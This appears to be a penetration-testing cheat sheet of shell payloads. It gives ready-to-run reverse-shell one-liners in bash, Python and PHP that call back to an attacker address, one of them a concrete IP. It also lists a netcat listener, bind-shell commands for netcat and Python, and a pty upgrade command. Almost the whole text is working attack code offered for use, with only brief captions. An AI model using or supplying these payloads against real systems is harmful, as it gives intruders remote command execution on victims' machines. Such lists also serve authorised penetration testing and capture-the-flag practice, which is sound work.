# Reverse shell
The victim connects to the attacker machine and provides a shell.
The attacker must wait for the connection:
```
# Attacker listens
nc -lvnp 4444
```

**Bash**
```
bash -i >& /dev/tcp/<attacker>/4444 0>&1
```
or
```
bash -c 'bash -i >& /dev/tcp/10.10.16.50/4444 0>&1'
```

**Python**
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**PHP**
```
php -r '$sock=fsockopen("<attacker>", 4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```


# Bind shell
Opens a port on the victim. Once the attacker connects a shell is provided.
Useful if the victim can not reach the attacker.

**Bash**
```
nc -nlvp 4444 -e /bin/bash
```

**Python**
```
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",4444));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

# Upgrade shell

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```